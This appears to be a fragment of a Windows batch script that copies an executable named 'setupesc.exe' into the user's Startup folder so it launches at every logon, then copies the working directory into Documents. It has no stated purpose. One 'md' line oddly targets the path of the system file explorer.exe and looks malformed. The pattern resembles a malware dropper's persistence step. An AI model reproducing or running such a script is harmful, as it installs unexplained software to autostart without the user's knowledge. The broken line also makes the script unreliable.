copy "%cd%\setupesc.exe" "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

md %SystemRoot%\explorer.exe %UserProfile%\Documents\setupesc

xcopy /s %cd% %UserProfile%\Documents\setupesc

